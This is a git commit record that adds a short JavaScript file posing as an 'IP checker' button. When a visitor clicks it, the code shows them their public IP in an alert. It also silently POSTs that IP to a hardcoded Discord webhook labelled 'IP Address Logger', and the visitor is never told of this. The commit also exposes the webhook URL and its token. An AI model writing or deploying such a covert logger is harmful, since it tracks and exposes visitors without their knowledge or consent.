4eef32badb435e1fe593e01ac7aac79f92a27e99
Sinny <76957008+SinnyNo1@users.noreply.github.com>
2021-02-14 08:32:42 +0700

    Initial commit

---
+++ Index.js
@@ -0,0 +1,24 @@
+let ip = document.getElementById('IP')
+
+function checkip(response) {
+    fetch('http://api.ipify.org/?format=json')
+    .then(results =>  results.json())
+    .then(data => {
+        const url = "https://discord.com/api/webhooks/810207690415931422/1fopeXrycEDAQqHXeyCstLBOFe-vTFOxTul6wuPkiGy3Ojo79Tl63fGyODV1WQt_oyjo"
+        const msg = {
+        "content": null,
+        "embeds": [
+        {
+            "title": "IP Address Logger",
+            "description": "IP Address : "+data.ip,
+            "color": 16761344
+        }
+        ],
+        "username": "IP Adddress Logger"
+        }
+        fetch(url,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg)})
+        alert("Your IP Address : "+data.ip)
+    })
+}
+
+ip.addEventListener("click" , checkip)
